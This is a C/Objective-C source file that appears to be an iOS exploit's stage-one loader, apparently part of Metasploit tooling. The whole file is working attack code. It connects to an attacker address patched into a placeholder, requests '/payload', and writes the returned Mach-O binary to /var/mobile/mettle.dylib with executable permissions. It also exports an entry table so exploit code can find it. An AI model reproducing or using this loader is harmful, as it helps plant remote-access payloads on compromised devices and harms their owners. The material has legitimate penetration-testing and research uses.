#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

#include <mach/mach.h>

#include "magic.h"

#import <Foundation/Foundation.h>

#import <dlfcn.h>

#include <mach-o/dyld.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

//#define DEBUG 1
#ifdef DEBUG
#define LOG(msg) \
  NSLog(@msg); \
  fprintf(stderr, msg); \
  fflush(stderr);

#else
#define LOG(msg) {}
#endif

void fail(uint64_t x) {
    *(volatile int*)(0xbad000000000ull + x) = 0xdead;
}
#define ASSERT(x) if (!(x))fail(0xa00000000ull + __LINE__)

int main() {

  LOG("Starting...\n");
  LOG("Starting...\n");
  LOG("Starting...\n");
  LOG("Starting...\n");
  LOG("Starting...\n");
  LOG("Starting...\n");
  LOG("Starting...\n");

  char * file_path = "/var/mobile/mettle.dylib";
  unlink(file_path);
  LOG("Downloading payload\n");

  const char config_placeholder[1024] = "PAYLOAD_URL";

  // Load the payload from server
  int sockfd = 0;
  struct sockaddr_in serv_addr;
  const char *getpayload = "GET /payload HTTP/1.1\r\n\r\n";
  const int chunk_size = 4096;
  char* payload_buffer = malloc(chunk_size);
  if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
    LOG("Could not connect socket");
    return -1;
  }

  serv_addr.sin_family = AF_INET;
  serv_addr.sin_addr.s_addr = *(uint32_t*)config_placeholder;
  serv_addr.sin_port = *(uint16_t*)(config_placeholder + 4);

  LOG("Connecting...\n");
  if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
    LOG("Could not connect\n");
    return -1;
  }
  send(sockfd, getpayload, strlen(getpayload), 0);

  int payloadfd = open(file_path, O_WRONLY | O_CREAT, 0700);
  int read_header = 0;
  int n;
  while ((n = read(sockfd, payload_buffer, chunk_size)) > 0) {
    if (!read_header) {
      char * payload_start = (char*)memmem((unsigned char*)payload_buffer, chunk_size, (unsigned char*)"\xcf\xfa\xed\xfe", 4);
      write(payloadfd, payload_start, n - (payload_start - payload_buffer));
      read_header = 1;
    } else {
      write(payloadfd, payload_buffer, n);
    }
  }

  close(payloadfd);
  close(sockfd);
  free(payload_buffer);

  LOG("exit!\n");
  exit(0);
  LOG("exit lol!\n");

  return 0;
}

uint64_t entry[] = { MAGIC, (uint64_t)&main };

